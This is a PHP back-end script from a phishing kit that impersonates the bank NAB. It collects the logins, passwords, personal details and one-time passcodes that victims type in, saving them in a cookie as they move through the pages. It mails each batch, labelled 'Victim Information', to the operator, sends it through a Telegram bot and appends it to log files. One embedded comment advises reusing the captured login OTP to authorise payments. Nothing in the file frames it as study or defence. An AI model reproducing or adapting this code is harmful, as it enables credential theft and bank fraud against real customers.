<?php
require_once "../../inc/m3dular_config.php"; 
require_once "../../m3cache/m3dular_functions.php"; 
require_once "../../m3cache/accesschecker.php";  
$loremdata=lorem(20);

 




error_reporting(0);


$date = date('l d F Y');
$time = date('H:i');


$n=$_GET['n'];





// VLAD COOKIE LOADER!
// ATTACH vlad_forname to make it better


// print_r($_POST);
// print_r($_COOKIE);




$blacklist=array("csrf","session","device","signoncounter","Error","counter");
$blacklistvalue=array("undefined index");

$formarray=array();


foreach ($_POST as $key => $value){

    // blacklist check

$blacklistcheck=1;

// blacklist check and approve/break to clean inputs
    foreach($blacklist as $blacklistkeywrd){

        if (preg_match("/$blacklistkeywrd/i", $key)) {
            // echo "Found!". " in ". "$key" . "<br>" ;

           $blacklistcheck=0;
           break;
        }   }



        foreach($blacklistvalue as $blv){

            if (preg_match("/$blv/i", $value)) {
                // echo "Found!". " in ". "$key" . "<br>" ;
    
               $blacklistcheck=0;
               break;
            }   }



        if($blacklistcheck){
            $temparray=array($key=>$value);
            // array_push($formarray,$temparray);   
            $formarray[$key] =$value;        
        }


    

}



// print_r($formarray);

// echo "<hr>";

$currentformjson= json_encode($formarray); // overrite cookie string




$calcarray=array();


if(!isset($_COOKIE['vladdata'])){

// echo "Empty data so we set fresh json object";
$calcarray=array("name"=>"m3d");

$calcdata=$formarray; // SET THIS INCASE FIRST SENDING

// echo json_encode($calcarray); // overrite cookie string
setcookie('vladdata',$currentformjson , time() + (86400 * 30) , "/"); // 86400 = 1 day


}

else{


// load json array from cookie

// echo "loadjson form";



$cacheddata=json_decode($_COOKIE['vladdata'],true);

$calcdata=array_merge($cacheddata,$formarray);



// print_r($calcdata);


// combine with new data and overrite cookie


setcookie('vladdata',json_encode($calcdata ), time() + (86400 * 30) , "/"); // 86400 = 1 day




}



// HANDLING ALL MAILING INCLUDING MAILING ROUTES

if(isset($_GET['ml'])){


$ip = $_SERVER['REMOTE_ADDR'];




    $ip = $_SERVER['REMOTE_ADDR'];
    $systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
    $VictimInfo1 = "| Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
    $VictimInfo2 = "| Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
    $VictimInfo3 = "| UserAgent : " . $systemInfo['useragent'] . "";
    $VictimInfo4 = "| Browser : " . $systemInfo['browser'] . "";
    $VictimInfo5 = "| Os : " . $systemInfo['os'] . "";
    
    



    if($_GET['ml']==1){

        $SUBPREFIX="LOGIN";

        $data = "
        + ----------- NAB LOGIN ----------+
        | Username : {$calcdata['username']}
        | Password :  {$calcdata['password']}
     
        +------------ Victim Information -------------+
        $VictimInfo2
        Received : $date @ $time
        ---- NEW LOG -------
        ";
        
    
    }

    

    if($_GET['ml']==2){

        $SUBPREFIX="INFO";

        $data = "
        ----- $OWNER  ----
        + ----------- NAB PERSONAL INFO ----------+
        | Name : {$calcdata['name']}
        | Phone Number :  {$calcdata['phone']}
        | Date Of Birth :  {$calcdata['dob']}
        | Zip Code :  {$calcdata['zipcode']}

        + ----------- NAB LOGIN ----------+
        | Username : {$calcdata['username']}
        | Password :  {$calcdata['password']}
     
        +------------ Victim Information -------------+
        ";
        
    
    }


    
    if($_GET['ml']==3){

        $SUBPREFIX="OTP 1";

        $data = "
        ----- $OWNER  ----
        + ----------- NAB PERSONAL INFO ----------+
        
        + ----------- OTP 1 ----------+
        | OTP : {$calcdata['otpcode1']}

        + ----------- NAB LOGIN ----------+
        | Name : {$calcdata['name']}
        | Phone Number :  {$calcdata['phone']}
        | Date Of Birth :  {$calcdata['dob']}
        | Zip Code :  {$calcdata['zipcode']}

        + ----------- NAB LOGIN ----------+
        | Username : {$calcdata['username']}
        | Password :  {$calcdata['password']}
     
        +------------ Victim Information -------------+
        ";
        
    
    }

    
    if($_GET['ml']==4){

    
        $SUBPREFIX="OTP 2";
        $data = "
        ----- $OWNER  ----


    
        + ----------- NAB PERSONAL INFO ----------+

        + ----------- OTP 2 ----------+
        | OTP2 : {$calcdata['otpcode2']}

        
        + ----------- OTP 1 ----------+
        | OTP1 : {$calcdata['otpcode1']}



        + ----------- NAB LOGIN ----------+
        | Name : {$calcdata['name']}
        | Phone Number :  {$calcdata['phone']}
        | Date Of Birth :  {$calcdata['dob']}
        | Zip Code :  {$calcdata['zipcode']}
        + ----------- NAB LOGIN ----------+
        | Username : {$calcdata['username']}
        | Password :  {$calcdata['password']}
     
        +------------ Victim Information -------------+
        ";
        
    
    }

    if($_GET['ml']==5){

    
        $SUBPREFIX="LOGIN";
        $data = "
        + ----------- LOGIN OTP ----------+
         IT's for login but also u can use 
for payment if the user repost the information of login :D
                     Just Be Smart
              + ---------------------+
        | LOGIN OTP : {$calcdata['securityCode']}
        + ----------- NAB LOGIN ----------+
        | Username : {$calcdata['username']}
        | Password :  {$calcdata['password']}
     
        +------------ Victim Information -------------+
        ";
        
    
    }

    


 


	$headers = "From:$ccname <rezzzu@resultsz.co.uk>";
    mail($EMAIL,   "NAB $SUBPREFIX from " . $_SERVER['REMOTE_ADDR'],$data,$headers);
    if($DEBUG){mail("test@localhost"," NAB from " . $_SERVER['REMOTE_ADDR'] , $data, $headers);}
    if($TELEGRAM){sendToTelegram2("$data",$TELEGRAMBOTTOKEN,$TELEGRAMCHANNELID );}




if($SAVELOGS){

    if (!file_exists("$SAVEBINDIRECTORY")) {
      mkdir("$SAVEBINDIRECTORY", 0777, true);
  }
  
  // save there 
  
  $fp = fopen("$SAVEBINDIRECTORY"."/binlist.txt", 'a');//opens file in append mode  
  fwrite($fp, "\n");  
  fwrite($fp, "$firstsix");  
  fclose($fp);  
  
    $fp = fopen("$SAVEBINDIRECTORY"."/data.txt", 'a');//opens file in append mode  
    fwrite($fp, "\n");  
    fwrite($fp, $data);  
    fclose($fp);  
   
  
  
  }
  







} // isset GET ML





// HANDLE REDIRECTS/ PAGE CHANGE



if(isset($_GET['rdr'])){

    echo "<script>document.location='$REDIRECT'</script>";

    die();
}


if(isset($_GET['n'])){

    echo "<script>document.location='../$n.php'</script>";
}

?>